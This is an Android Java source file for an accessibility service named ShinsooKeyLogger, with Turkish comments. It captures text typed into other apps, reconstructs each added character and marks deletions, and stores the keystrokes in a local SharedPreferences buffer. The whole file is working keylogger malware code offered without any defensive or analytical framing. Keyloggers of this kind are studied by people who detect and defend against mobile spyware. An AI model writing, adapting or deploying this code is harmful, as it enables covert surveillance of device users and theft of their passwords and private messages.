package com.shinsoo.shinsoo;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import java.util.List;

public class ShinsooKeyLogger extends AccessibilityService {

    private String lastText = "";

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                        | AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                   | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        int type = event.getEventType();

        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> texts = event.getText();
            if (texts != null && !texts.isEmpty()) {
                String current = texts.get(0) != null ? texts.get(0).toString() : "";
                if (!current.equals(lastText)) {
                    // Yeni eklenen karakteri bul
                    String added = "";
                    if (current.length() > lastText.length()) {
                        added = current.substring(lastText.length());
                    } else if (current.length() < lastText.length()) {
                        added = "[DEL]";
                    }
                    lastText = current;

                    if (!added.isEmpty()) {
                        // SharedPreferences ile kaydet
                        SharedPreferences prefs = getSharedPreferences(
                            "shinsoo_keys", MODE_PRIVATE);
                        String existing = prefs.getString("buffer", "");
                        prefs.edit().putString("buffer", existing + added).apply();
                    }
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}
                  }
